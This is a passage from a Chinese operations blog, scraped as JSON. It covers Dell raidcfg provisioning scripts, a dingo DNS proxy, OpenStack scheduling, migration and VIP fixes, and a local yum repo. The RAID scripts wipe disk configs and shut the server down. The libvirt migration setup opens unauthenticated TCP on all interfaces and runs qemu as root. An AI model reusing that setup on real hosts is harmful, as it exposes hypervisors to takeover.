raid5_n4x2接下来配置raid5_n4x2.sh脚本vim &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;raidcfg&#x2F;raid5&#x2F;raid5_n4x2.sh(略)chmod 755 &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;raidcfg&#x2F;raid5&#x2F;raid5_n4x2.shcobbler distro edit --name&#x3D;dtk5.3_raid5_n4x2 --kopts&#x3D;&quot;share_type&#x3D;tftp share_location&#x3D;&#x2F;raidcfg&#x2F;raid5_n4x2 share_script&#x3D;raid5_n4x2.sh tftp_ip&#x3D;x.x.x.x&quot;cobbler sync 常用RAID脚本raid5-3块盘/组 123456789101112131415161718192021cat &gt;&gt; &#x2F;tmp&#x2F;raid5.ini &lt;&lt;EOF[vdisk0]controllerid&#x3D;0raid&#x3D;5readpolicy&#x3D;nrawritepolicy&#x3D;wtstripesize&#x3D;64cachepolicy&#x3D;eadisk&#x3D;0:0:1,0:1:1,0:2:1EOFecho &quot;…………. reset Other Raid ………….&quot;raidcfg -ctrl -c&#x3D;0 -ac&#x3D;fgnclrecho &quot;…………. reset all disks ………….&quot; raidcfg -ctrl -c&#x3D;0 -ac&#x3D;rstecho &quot;………. 3 disks for raid5 ……….&quot;raidcfg -i&#x3D;&#x2F;tmp&#x2F;raid5.iniecho &quot;…………… fast init ……………&quot;raidcfg -vd -c&#x3D;0 -vd&#x3D;0 -ac&#x3D;fi echo &quot;…………… RAID5 is created, this is server will be shutdown... ……………&quot;shutdown 2组raid5-4块盘/组(Dell R720) 123456789101112131415161718192021222324252627282930313233343536373839#!&#x2F;bin&#x2F;bashcat &gt;&gt; &#x2F;tmp&#x2F;raid5_n4x2.ini &lt;&lt;EOF[vdisk0]controllerid&#x3D;0raid&#x3D;5readpolicy&#x3D;nrawritepolicy&#x3D;wtstripesize&#x3D;64cachepolicy&#x3D;eadisk&#x3D;0:0:1,0:1:1,0:2:1,0:3:1[vdisk1]controllerid&#x3D;0raid&#x3D;5readpolicy&#x3D;nrawritepolicy&#x3D;wtstripesize&#x3D;64cachepolicy&#x3D;eadisk&#x3D;0:4:1,0:5:1,0:6:1,0:7:1EOFecho &quot;………….reset Other Raid ………….&quot;raidcfg -ctrl -c&#x3D;0 -ac&#x3D;fgnclrecho &quot;…………. reset all disks ………….&quot;raidcfg -ctrl -c&#x3D;0 -ac&#x3D;rstecho &quot;………. 4 disks for raid5 ……….&quot;raidcfg -i&#x3D;&#x2F;tmp&#x2F;raid5_n4x2.iniecho &quot;…………… fast init ……………&quot;raidcfg -vd -c&#x3D;0 -vd&#x3D;0 -ac&#x3D;fi raidcfg -vd -c&#x3D;0 -vd&#x3D;1 -ac&#x3D;fi echo &quot;…………… This is server will be shutdown... ……………&quot;shutdown注：1.多组Raid下，controllerid都配置为0，因为共属于一个控制器，而vdisk可以有多个，如[vdisk&#x3D;0]、[vdisk&#x3D;1]2.多组Raid与硬盘容量无关，只需保证每组RAID容量一致即可。3.若原硬盘已有RAID信息, 这条指令可以清除：raidcfg -ctrl -c&#x3D;0 -ac&#x3D;fgnclr raid5_n3x1+raid0_n1x1 12345678910111213141516171819202122232425262728293031323334#!&#x2F;bin&#x2F;bashcat &gt;&gt; &#x2F;tmp&#x2F;raid5_n3x1+raid0_n1x1.ini &lt;&lt;EOF[vdisk0]controllerid&#x3D;0raid&#x3D;5readpolicy&#x3D;nrawritepolicy&#x3D;wtstripesize&#x3D;64cachepolicy&#x3D;eadisk&#x3D;0:0:1,0:1:1,0:2:1[vdisk1]controllerid&#x3D;0raid&#x3D;0readpolicy&#x3D;nrawritepolicy&#x3D;wtstripesize&#x3D;64cachepolicy&#x3D;eadisk&#x3D;0:3:1EOFecho &quot;………….reset Other Raid ………….&quot;raidcfg -ctrl -c&#x3D;0 -ac&#x3D;fgnclrecho &quot;…………. reset all disks ………….&quot;raidcfg -ctrl -c&#x3D;0 -ac&#x3D;rstecho &quot;………. raid5 + raid0 ……….&quot;raidcfg -i&#x3D;&#x2F;tmp&#x2F;raid5_n3x1+raid0_n1x1.iniecho &quot;…………… fast init ……………&quot;raidcfg -vd -c&#x3D;0 -vd&#x3D;0 -ac&#x3D;fi raidcfg -vd -c&#x3D;0 -vd&#x3D;1 -ac&#x3D;fi echo &quot;…………… RAID is created, this is server will be shutdown... ……………&quot;shutdown 附录：RAID参数详解1234567891011121314上面这些指令从哪儿来？raidcfg -h 帮助都有使用方法，常用的如下：controller 简写为 -ctrlaction 简写为 -accontrollerid 简写为 -cadisk, pdisk 简写为 -ad, -pdraid 简写为 -rsize 简写为 -szstripsize 简写为 -sszcachepolicy 简写为 -cpwritepolicy 简写为 -wpreadpolicy 简写为 -rpvdisk 简写为 -vd raidcfg命令分类信息输出类12345678910111213141516171819202122232425262728293031#列出所有RAID控制器信息raidcfg &lt;-ctrl&gt;#列出指定ID的RAID控制器信息raidcfg &lt;-ctrl&gt; [-c&#x3D;ID]#显示指定控制器上的所有物理磁盘信息raidcfg &lt;-ad|-pd&gt; &lt;-c&#x3D;ID&gt;#显示指定控制器指定vdisk上的所有物理磁盘信息raidcfg &lt;-ad|-pd&gt; &lt;-c&#x3D;ID&gt; [-vd&#x3D;ID]#显示具体某块物理磁盘的信息raidcfg &lt;-ad|-pd&gt; &lt;-c&#x3D;ID&gt; [-ad&#x3D;ch:targ[:encl],ch:targ[:encl],...]#显示所有控制器上的所有vdisk信息raidcfg &lt;-vd&gt;#显示指定控制器上的所有vdisk信息raidcfg &lt;-vd&gt; [-c&#x3D;ID]#显示指定控制器上的指定vdisk信息raidcfg &lt;-vd&gt; &lt;-c&#x3D;ID&gt; [-vd&#x3D;ID]#将系统函数调用的返回值赋予用户指定的环境变量raidcfg &lt;-se&gt; &lt;-envn&#x3D;string&gt; &lt;-envc&#x3D;function&gt; [-f&#x3D;filename] Function Calls: getcontrollerslots. #将系统函数调用的返回值赋予用户指定的环境变量raidcfg &lt;-se&gt; &lt;-envn&#x3D;string&gt; &lt;-envc&#x3D;function&gt; &lt;-c&#x3D;ID&gt; [-f&#x3D;filename] Function Calls:getfirmware,getcontrollertype,getadisks,getadiskcount,getfreeadisks, getfreeadiskcount,getfreeadisksize,gethotspares. vdisk操作类1234567891011121314151617181920#创建vdiskraidcfg &lt;-ctrl&gt; &lt;-ac&#x3D;cvd&gt; &lt;-c&#x3D;ID&gt; &lt;-ad|-pd&#x3D;ch:targ[:encl],ch:targ[:encl], ...&gt; [-r&#x3D;n] [-sz&#x3D;n] [-ssz&#x3D;n] [-cp&#x3D;d | e] [-rp&#x3D;ra | ara | nra | rc | nrc] [-wp&#x3D;wb | wt | fwb | wc | nwc] [-fd&#x3D;ch:targ,ch:targ,...] [-str&#x3D;number] [-sp&#x3D;number]#删除指定控制器上的所有vdiskraidcfg &lt;-vd&gt; &lt;-ac&#x3D;dvd&gt; &lt;-c&#x3D;ID&gt;#删除指定控制器上的指定vdiskraidcfg &lt;-vd&gt; &lt;-ac&#x3D;dvd&gt; &lt;-c&#x3D;ID&gt; [-vd&#x3D;ID]#对指定控制器上的vdisk执行快速初始化raidcfg &lt;-vd&gt; &lt;-c&#x3D;ID&gt; &lt;-vd&#x3D;ID&gt; &lt;-ac&#x3D;fi&gt;#对指定控制器上的vdisk执行完全(慢速)初始化raidcfg &lt;-vd&gt; &lt;-c&#x3D;ID&gt; &lt;-vd&#x3D;ID&gt; &lt;-ac&#x3D;sli&gt;#取消指定vdisk的完全(慢速)初始化raidcfg &lt;-vd&gt; &lt;-c&#x3D;ID&gt; &lt;-vd&#x3D;ID&gt; &lt;-ac&#x3D;ci&gt; hotspare类1234567891011#分配全局hotspare磁盘raidcfg &lt;-ctrl&gt; &lt;-ac&#x3D;sghs&gt; &lt;-c&#x3D;ID&gt; &lt;-ad|-pd&#x3D;ch:targ[:encl]&gt;#取消分配全局hotspare磁盘raidcfg &lt;-ctrl&gt; &lt;-ac&#x3D;rghs&gt; &lt;-c&#x3D;ID&gt; &lt;-ad|-pd&#x3D;ch:targ[:encl]&gt;#在指定控制器上启用Controller Persistent Hot Spareraidcfg &lt;-ctrl&gt; &lt;-c&#x3D;ID&gt; &lt;-ac&#x3D;ephs&gt;#在指定控制器上禁用Controller Persistent Hot Spareraidcfg &lt;-ctrl&gt; &lt;-c&#x3D;ID&gt; &lt;-ac&#x3D;dphs&gt; raid控制类1234567891011121314151617#reset指定控制器raidcfg &lt;-ctrl&gt; &lt;-c&#x3D;ID&gt; &lt;-ac&#x3D;rst&gt; #读取所有控制器上的RAID配置信息，输出到指定的ini文件raidcfg &lt;-o&#x3D;filename&gt;#读取指定的ini文件,在配置文件指定的制器上创建RAIDraidcfg &lt;-i&#x3D;filename&gt;#在指定控制器上导入外部RAID配置信息raidcfg &lt;-ctrl&gt; &lt;-c&#x3D;ID&gt; &lt;-ac&#x3D;fgnimp&gt;#在指定控制器上清除外部RAID配置信息raidcfg &lt;-ctrl&gt; &lt;-c&#x3D;ID&gt; &lt;-ac&#x3D;fgnclr&gt;#在指定控制器上恢复外部RAID配置信息raidcfg &lt;-ctrl&gt; &lt;-c&#x3D;ID&gt; &lt;-ac&#x3D;fgnrvr&gt; 通用参数1234567891011除了[-ver]之外，可以应用于上边任何命令中:[-ver] -- 显示RAIDCFG版本[-l&#x3D;logfilename] -- 将输出写入到log文件中[-si] -- 静默，抑制console输出应用举例:假设系统总共有8块硬盘,前两块146G做RAID1,后5块900G做RAID5,最后一块做全局hotspareraidcfg -ctrl -ac&#x3D;cvd -c&#x3D;0 -ad&#x3D;0:0:0,0:1:0 -r&#x3D;1raidcfg -ctrl -ac&#x3D;cvd -c&#x3D;0 -ad&#x3D;0:2:0,0:3:0,0:4:0,0:5:0,0:6:0 -r&#x3D;5raidcfg -ctrl -ac&#x3D;sghs -c&#x3D;0 -ad&#x3D;0:7:0 参考：官方参数说明 参考：chinaunix","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"RAID","slug":"RAID","permalink":"https://garywu520.github.io/tags/RAID/"},{"name":"cobbler","slug":"cobbler","permalink":"https://garywu520.github.io/tags/cobbler/"},{"name":"DTK","slug":"DTK","permalink":"https://garywu520.github.io/tags/DTK/"},{"name":"raidcfg","slug":"raidcfg","permalink":"https://garywu520.github.io/tags/raidcfg/"}]},{"title":"dingo反代Goolge DNS","slug":"Dingo反代Google-DNS","date":"2017-04-03T08:52:07.000Z","updated":"2018-04-03T09:54:22.060Z","comments":true,"path":"2017/04/03/Dingo反代Google-DNS/","link":"","permalink":"https://garywu520.github.io/2017/04/03/Dingo%E5%8F%8D%E4%BB%A3Google-DNS/","excerpt":"1访问Google一直是程序员乃至IT人士基本生存技能，今天聊聊无污染DNS之Dingo","text":"1访问Google一直是程序员乃至IT人士基本生存技能，今天聊聊无污染DNS之Dingo 准备条件 121.境外服务器一台2.安装go环境 dingo安装 123456789101112cd &#x2F;optgit clone https:&#x2F;&#x2F;github.com&#x2F;pforemski&#x2F;dingo.gitcd dingo &amp;&amp; vim .&#x2F;build.sh 修改编译后的二进制文件路径DEST&#x3D;&quot;&#x2F;opt&#x2F;dingo-$VERSION&quot;go get github.com&#x2F;pforemski&#x2F;dingo.&#x2F;build.sh linux-amd64编译完成后会在&#x2F;opt目录下出现。执行dingo --help会出现dingo的参数说明&#x2F;opt&#x2F;dingo-linux-amd64&#x2F;dingo-linux-amd64 --help软链ln -s &#x2F;opt&#x2F;dingo-linux-amd64&#x2F;dingo-linux-amd64 &#x2F;usr&#x2F;sbin&#x2F; dingo使用 12345启动（默认使用Google DNS）dingo-linux-amd64 -port&#x3D;5353 -bind&#x3D;x.x.x.x 注：-bind可以指定为境外服务器公网IP -port指定本机开放端口 测试 12测试之前,iptables允许UDP 5353端口访问dig twitter.com @x.x.x.x -p5353 开机自启动 12vim &#x2F;etc&#x2F;rc.localdingo-linux-amd64 -port&#x3D;5353 -bind&#x3D;x.x.x.x 高级使用 1234dingo-linux-amd64 -port&#x3D;5353 -bind&#x3D;x.x.x.x上面这条启动命令默认使用的是Google DNS, 当然也可以代理使用自定义DNS, 命令如下：dingo-linux-amd64 -bind 207.246.67.28 -port&#x3D;5353 -odns:server&#x3D;1.0.0.1,9.9.9.9","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"dingo","slug":"dingo","permalink":"https://garywu520.github.io/tags/dingo/"},{"name":"Google DNS","slug":"Google-DNS","permalink":"https://garywu520.github.io/tags/Google-DNS/"}]},{"title":"问题汇总-openstack计算节点无法调度及热迁移调度","slug":"问题汇总-openstack计算节点无法调度及热迁移调度","date":"2017-03-22T12:07:01.000Z","updated":"2018-03-22T12:42:23.321Z","comments":true,"path":"2017/03/22/问题汇总-openstack计算节点无法调度及热迁移调度/","link":"","permalink":"https://garywu520.github.io/2017/03/22/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-openstack%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9%E6%97%A0%E6%B3%95%E8%B0%83%E5%BA%A6%E5%8F%8A%E7%83%AD%E8%BF%81%E7%A7%BB%E8%B0%83%E5%BA%A6/","excerpt":"1由于生产环境openstack N版在使用中发现, （疑似后来新添加的4个）计算节点无法被nova_schedule调度, 即创建虚拟机不能被分配到这几台计算节点上。在后来的热迁移测试中,也发现了问题。由于这套openstack非自己部署,所以故障排查尤为艰难，下面详细记录下：","text":"1由于生产环境openstack N版在使用中发现, （疑似后来新添加的4个）计算节点无法被nova_schedule调度, 即创建虚拟机不能被分配到这几台计算节点上。在后来的热迁移测试中,也发现了问题。由于这套openstack非自己部署,所以故障排查尤为艰难，下面详细记录下： 首先去验证计算节点服务是否正常1234首先去验证计算节点服务是否正常openstack compute service list 其结果都是正常的 其次,需要保证所有计算节点都在一个可用域中1通过Web控制台或命令来进行查看与验证 参考：AZ(可用域)与HA（主机聚合） 12345以上的排查结果没有发现任何疑问，最后通过比对控制节点的配置文件查出了猫腻。问题如下：1. 后增的计算节点没有配置CPU超配比例与Ceph共享存储2. 热迁移调度失败 问题1解决方案：计算节点无法被schedule调度所有计算节点操作 1对四台有问题的计算节点进行配置新增, 主要有以下几个方面： 1234567891011121314151617181920212223242526272829检测计算节点是否支持虚拟化egrep -c &#39;(vmx|svm)&#39; &#x2F;proc&#x2F;cpuinfo#CPU超配(vim &#x2F;etc&#x2F;nova&#x2F;nova.conf)[DEFAULT]vcpu_pin_set &#x3D; 4-31cpu_allocation_ratio &#x3D; 32.0ram_allocation_ratio &#x3D; 0.0reserved_host_memory_mb &#x3D; 4096#ceph共享存储配置[libvirt]images_type &#x3D; rbdimages_rbd_pool &#x3D; vmsimages_rbd_ceph_conf &#x3D; &#x2F;etc&#x2F;ceph&#x2F;ceph.confdisk_cachemodes &#x3D; &quot;network&#x3D;writeback&quot;inject_password &#x3D; falseinject_key &#x3D; falseinject_partition &#x3D; -2hw_disk_discard &#x3D; unmap#重启计算节点服务,问题解决systemctl restart libvirtd openstack-nova-compute个别计算节点不能被调度是因为同一个可用域中的计算节点配置环境不同【即CPU超配和Ceph未配置】 导致nova-schedule忽略调度此计算节点导致。因为schedule会根据计算节点的可用资源情况进行条件筛选，符合条件(默认条件是相同计算节点配置，可用资源较少)才被成功调度。 问题2解决方案：热迁移配置所有计算节点操作 1234567891011121314151617181920212223242526272829修改libvirt配置&#x2F;etc&#x2F;libvirt&#x2F;libvirtd.conf 修改为如下内容:listen_tls &#x3D; 0 listen_tcp &#x3D; 1 auth_tcp &#x3D; &quot;none&quot; listen_addr &#x3D; &quot;0.0.0.0&quot; tcp_port &#x3D; &quot;16509&quot;&#x2F;etc&#x2F;sysconfig&#x2F;libvirtd 修改为如下内容:LIBVIRTD_ARGS&#x3D;&quot;--listen&quot;&#x2F;etc&#x2F;libvirt&#x2F;qemu.conf 修改为如下内容:vnc_listen &#x3D; &quot;0.0.0.0&quot;user &#x3D; &quot;root&quot;group &#x3D; &quot;root&quot;dynamic_ownership &#x3D; 1修改nova配置&#x2F;etc&#x2F;nova&#x2F;nova.conf 修改为如下内容：[libvirt]live_migration_downtime &#x3D; 500live_migration_downtime_steps &#x3D; 10live_migration_downtime_delay &#x3D; 75live_migration_flag&#x3D;VIR_MIGRATE_UNDEFINE_SOURCE,VIR_MIGRATE_PEER2PEER,VIR_MIGRATE_LIVE,VIR_MIGRATE_TUNNELLED#重启服务systemctl restart libvirtd openstack-nova-compute 以上配置正常后,其中一个计算节点扔不能被调度12热迁移测试时, 通过nova-compute.log日志可以看到一堆错误：Error oslo_message.rpc.server ...... Exception during message handling 1这类报错基本都是由于nova.conf配置文件语法问题导致，虽然服务正常启动，但是不能被成功调度。解决方案：拷贝正常的配置文件覆盖并简要修改，重启服务，测试OK 如何快速定位故障?1首先理清楚架构, 其次尝试去修改错误, 验证时或无解决思路时, 务必要查看日志，日志基本能够说明一切。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"计算节点","slug":"计算节点","permalink":"https://garywu520.github.io/tags/%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9/"},{"name":"nova_schedule调度","slug":"nova-schedule调度","permalink":"https://garywu520.github.io/tags/nova-schedule%E8%B0%83%E5%BA%A6/"},{"name":"nova_schedule","slug":"nova-schedule","permalink":"https://garywu520.github.io/tags/nova-schedule/"},{"name":"热迁移调度","slug":"热迁移调度","permalink":"https://garywu520.github.io/tags/%E7%83%AD%E8%BF%81%E7%A7%BB%E8%B0%83%E5%BA%A6/"}]},{"title":"使用光盘搭建本地yum源","slug":"使用光盘搭建本地yum源","date":"2017-03-20T06:30:46.000Z","updated":"2018-03-20T06:37:05.248Z","comments":true,"path":"2017/03/20/使用光盘搭建本地yum源/","link":"","permalink":"https://garywu520.github.io/2017/03/20/%E4%BD%BF%E7%94%A8%E5%85%89%E7%9B%98%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%BA%90/","excerpt":"1适用场景： 刚装好的系统，想安装一些常用软件和一些包组的时候，就可以使用安装光盘搭建本地yum","text":"1适用场景： 刚装好的系统，想安装一些常用软件和一些包组的时候，就可以使用安装光盘搭建本地yum 第一步：挂载安装光盘 1mount &#x2F;dev&#x2F;cdrom &#x2F;mnt 第二步：编辑repo yum源文件 12345678910cd &#x2F;etc&#x2F;yum.repos.d&#x2F;mkdir backupmv *.repo backup&#x2F; #备份原repo文件[root@localhost yum.repos.d]# vi local.repo[local] #yum仓库的名字,被yum命令识别name&#x3D;local #这个name随便填baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;mnt #下载地址，这里我们用的file:&#x2F;&#x2F;协议, 而&#x2F;mnt是之前光盘挂载路径gpgcheck&#x3D;0 #不使用gpg检查rpm包的来源enabled&#x3D;1 #这个选项表示启动repo源，设置为0的时候，表示不启动 第三步：检查 1yum makecache 第四步: 测试效果 1234567891011yum install php -yLoaded plugins: fastestmirror, securitySetting up Install ProcessDetermining fastest mirrorsResolving Dependencies--&gt; Running transaction check---&gt; Package php.x86_64 0:5.3.3-49.el6 will be installed--&gt; Processing Dependency: php-common(x86-64) &#x3D; 5.3.3-49.el6 for package: php-5.3.3-49.el6.x86_64--&gt; Processing Dependency: php-cli(x86-64) &#x3D; 5.3.3-49.el6 for package: php-5.3.3-49.el6.x86_64--&gt; Processing Dependency: httpd-mmn &#x3D; 20051115 for package: php-5.3.3-49.el6.x86_64 参考: 强哥-技术之路","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"光盘","slug":"光盘","permalink":"https://garywu520.github.io/tags/%E5%85%89%E7%9B%98/"},{"name":"本地Yum","slug":"本地Yum","permalink":"https://garywu520.github.io/tags/%E6%9C%AC%E5%9C%B0Yum/"}]},{"title":"问题汇总-openstack-VM冷迁移","slug":"问题汇总-openstack-VM冷迁移","date":"2017-03-14T04:01:06.000Z","updated":"2018-03-16T06:43:11.597Z","comments":true,"path":"2017/03/14/问题汇总-openstack-VM冷迁移/","link":"","permalink":"https://garywu520.github.io/2017/03/14/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-openstack-VM%E5%86%B7%E8%BF%81%E7%A7%BB/","excerpt":"1知识要点: VM虚拟机的创建来自于nova的核心调度,并分配到资源占用较少的计算节点来存储。当然创建了&quot;可用域&quot;后,可以指定某个虚拟机被创建到指定的计算节点中。","text":"1知识要点: VM虚拟机的创建来自于nova的核心调度,并分配到资源占用较少的计算节点来存储。当然创建了&quot;可用域&quot;后,可以指定某个虚拟机被创建到指定的计算节点中。 适用场景1适用场景:当计算节点挂了,迁移上面VM虚拟机的时候用到 VM迁移/或者叫冷漂移1此操作前提: 已配置共享存储 12345678910111213141516171819201. 当某个计算节点挂了之后, 可以通过dashboard看到运行在这台计算节点的虚拟机已经成为关机状态。 例如: 挂掉的vm名称为Test-Bad 2. 在控制节点,查看其它可用的计算节点 openstack host list3. 从上面的结果中, 选择一个可用计算节点,准备将VM迁移 例如:选中的可用计算节点Host Name为: compute-2474. 选定新的目标计算节点后, 在控制节点执行如下迁移命令 nova evacuate Test-Bad compute-247 注:后面可以不加计算节点host则交给nova调度自动分配 此迁移命令保留了原始配置,包括实例ID、名称、UID和IP地址等等5. 迁移完成后, 再查看这个VM所属的计算节点是否已经变更 nova-manage vm list 或 登陆dashboard -- 管理员 -- 云主机数量中查看虚拟机属于哪个主机(即计算节点) 6. dashboard界面中手动再次启动这个虚拟机 123注意: 如果VM已关机,但是运行这个VM的物理计算节点正常运行, 则迁移会返回如下错误:ERROR (BadRequest): Compute service of compute-247 is still in use. (HTTP 400) (Request-ID: req-fa5e05de-2ddb-4392-92ff-2497e65aaae8)意思就是这个计算节点正在正常提供服务,无法执行迁移操作。 迁移VM命令-深入研究1234567891011命令格式：nova evacuate [--password pass] [--on-shared-storage] instance_name [target_host]其中:--password pass 指定VM实例的admin密码（如果指定了 --on-shared-storage，则无法使用）。如果没有指定密码，一个随机密码会被产生，并在迁移操作完成后被输出控制台。--on-shared-storage - 指定所有实例文件都在共享存储中。instance_name - 指定要迁移的实例名称。target_host - 指定VM实例迁移到的主机；如果您没有指定这个主机，Compute调度会为您自动选择一个可用主机。 迁移整个计算节点的所有VM1234567891011命令格式：nova host-evacuate instance_name [--target target_host] [--on-shared-storage] source_host其中：--target target_host 实例撤离到的主机；如果您没有指定这个主机，Compute调度会选择一个主机。可以使用以下命令找到可能的主机：nova host-list | grep compute--on-shared-storage - 指定所有实例文件都在共享存储中。source_host - 被迁移的计算节点主机名。例如：nova host-evacuate --target compute-247 compute-200 官方参考: Evacuate instances 参考2： RedHat ​","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"VM","slug":"VM","permalink":"https://garywu520.github.io/tags/VM/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"compute","slug":"compute","permalink":"https://garywu520.github.io/tags/compute/"},{"name":"计算节点","slug":"计算节点","permalink":"https://garywu520.github.io/tags/%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9/"},{"name":"VM迁移","slug":"VM迁移","permalink":"https://garywu520.github.io/tags/VM%E8%BF%81%E7%A7%BB/"}]},{"title":"问题汇总-openstack VM高可用","slug":"问题汇总-openstack VM高可用","date":"2017-03-04T02:01:43.000Z","updated":"2018-03-14T02:08:16.919Z","comments":true,"path":"2017/03/04/问题汇总-openstack VM高可用/","link":"","permalink":"https://garywu520.github.io/2017/03/04/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-openstack%20VM%E9%AB%98%E5%8F%AF%E7%94%A8/","excerpt":"12在openstack创建了两台虚拟机, 很快keepalived+LVS架构都部署好了,同时制定了一个VIP(192.168.10.100).测试的时候悲催了,同网段内其他机器Ping不通这个VIP, 纳尼。。。","text":"12在openstack创建了两台虚拟机, 很快keepalived+LVS架构都部署好了,同时制定了一个VIP(192.168.10.100).测试的时候悲催了,同网段内其他机器Ping不通这个VIP, 纳尼。。。 12在翻阅了一些文章以及结合自己的理解可以确定： openstack的IP地址分配全部由neutron服务负责, 所以手动指定VIP无效。 优雅的解决方案：allow_address_pairs实现虚拟机高可用12345前提: (1)keepalived+LVS完成部署 1.1 keepalived.conf中router_id配置不同、state不同、优先级不同 1.2 2台web主机,在lo网卡配置VIP,即Start LVS of Real Server(2)Neutron flat网络模式下-高可用实现 简要拓扑如下: 123456789101112131415161718192021在控制节点进行如下配置：(1)source 环境变量(2)找出flat网络的id号neutron net-list (3)查看这个flat网络下所有的port信息 neutron port-list --network_id&#x3D;54f5ea9b-5d05-42e3-995f-c00e6824be25(这个id就是flat的id) (4)创建keepalived的VIP虚拟IP地址(这个才是真正生效的VIP)neutron port-create --fixed-ip ip_address&#x3D;192.168.10.100(虚拟ip地址) --security-group default flat(5)把这个VIP分别绑定到2台LVS端口id上注: LVS主机的端口id可通过步骤3查看neutron port-update fee2f24e-87a1-4e23-b60b-8d4a33f9257f(这个id是LVS1的port id) --allowed_address_pairs list&#x3D;true type&#x3D;dict ip_address&#x3D;192.168.10.100neutron port-update 4082ae4a-5af6-43ea-9370-fa493fb9ad67(这个id是LVS2的port id) --allowed_address_pairs list&#x3D;true type&#x3D;dict ip_address&#x3D;192.168.10.100(6)验证操作neutron port-show fee2f24e-87a1-4e23-b60b-8d4a33f9257fneutron port-show 4082ae4a-5af6-43ea-9370-fa493fb9ad67 1此时这个VIP就已经生效了, 再进行测试，局域网就ping通VIP了，接下来可验证业务通过VIP访问。 参考：Neutron - 虚拟机中启用vip","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"neutron","slug":"neutron","permalink":"https://garywu520.github.io/tags/neutron/"},{"name":"LVS","slug":"LVS","permalink":"https://garywu520.github.io/tags/LVS/"},{"name":"openstack keepalived","slug":"openstack-keepalived","permalink":"https://garywu520.github.io/tags/openstack-keepalived/"},{"name":"allow address pairs地址对","slug":"allow-address-pairs地址对","permalink":"https://garywu520.github.io/tags/allow-address-pairs%E5%9C%B0%E5%9D%80%E5%AF%B9/"},{"name":"neutron 高可用","slug":"neutron-高可用","permalink":"https://garywu520.github.io/tags/neutron-%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"虚拟机启用VIP","slug":"虚拟机启用VIP","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%AF%E7%94%A8VIP/"},{"name":"allow_address_pairs实现虚拟机高可用","slug":"allow-address-pairs实现虚拟机高可用","permalink":"https://garywu520.github.io/tags/allow-address-pairs%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%AB%98%E5%8F%AF%E7%94%A8/"}]},{"title":"BeansDB豆瓣开源Key/Value分布式NoSQL","slug":"BeansDB豆瓣开源Key-Value分布式NoSQL","date":"2017-03-02T09:22:15.000Z","updated":"2017-11-14T06:38:16.492Z","comments":true,"path":"2017/03/02/BeansDB豆瓣开源Key-Value分布式NoSQL/","link":"","permalink":"https://garywu520.github.io/2017/03/02/BeansDB%E8%B1%86%E7%93%A3%E5%BC%80%E6%BA%90Key-Value%E5%88%86%E5%B8%83%E5%BC%8FNoSQL/","excerpt":"介绍 123BeansDB是由豆瓣开源的一个Key&#x2F;Value存储系统,基于亚马逊Dynamo进行二次开发。支持和接受memcache协议，官方客户端只有Python版，不过因为协议兼容也可以使用memcache客户端。","text":"介绍 123BeansDB是由豆瓣开源的一个Key&#x2F;Value存储系统,基于亚马逊Dynamo进行二次开发。支持和接受memcache协议，官方客户端只有Python版，不过因为协议兼容也可以使用memcache客户端。 特点 12345678与memcache相比，beansdb特点：1. 数据是持久化的，像value这种不可变的数据文件完全在硬盘上，内存中只存放key的hash索引2. 在持久化的基础上，为了提高可靠性，一份数据可以设置存放在多个地方3. 把分布式功能通过客户端api实现，而beansdb本身是单机的4. 存储引擎使用Bitcast的方式5. beansdb没有实现expired功能6. 其网络连接的管理直接照搬了redis的实现方式。 生产场景 1234据GitHub上的Beansdb介绍，豆瓣主要用Beansdb存储图片、Mp3、大文本等等，也就是说，Beansdb是适用于大键值的键值系统。截止2015年最新版本：V0.7.1.4下载地址：https:&#x2F;&#x2F;github.com&#x2F;douban&#x2F;beansdb 编译安装 1234安装方法在源码目录的INSTALL文件中，以下部分内容为摘录并整理git clone https:&#x2F;&#x2F;github.com&#x2F;douban&#x2F;beansdbcd beansdb.&#x2F;autogen.sh 1234567891011错误：[root@Twemproxy25 beansdb-master]# .&#x2F;autogen.sh autoreconf --installconfigure.ac:12: warning: macro &#96;AM_PROG_AR&#39; not found in libraryconfigure.ac:12: error: possibly undefined macro: AM_PROG_AR解决方法：在源码目录执行：sed -i -e &#39;s&#x2F;^AM_PROG_AR&#x2F;#AM_PROG_AR&#x2F;&#39; configure.ac再次执行：.&#x2F;autogen.sh 12345.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;beansdb make &amp;&amp; make installcd &#x2F;usr&#x2F;bin &amp;&amp; ln -s 